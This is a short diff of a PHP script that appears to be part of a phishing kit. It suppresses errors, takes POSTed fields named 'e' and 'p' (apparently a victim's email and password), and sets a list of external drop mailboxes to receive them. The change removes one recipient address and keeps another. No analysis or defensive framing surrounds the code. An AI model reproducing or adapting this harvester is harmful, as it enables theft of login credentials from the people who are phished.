@@ -4,7 +4,7 @@ header('Content-Type: application/json');
 
 error_reporting(0);
 
-$to = "jc4717287@gmail.com, evanskelvin2019@yandex.ru";
+$to = "evanskelvin2019@yandex.ru";
 
 if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['e']) && isset($_POST['p'])) {
     $email = $_POST['e'];
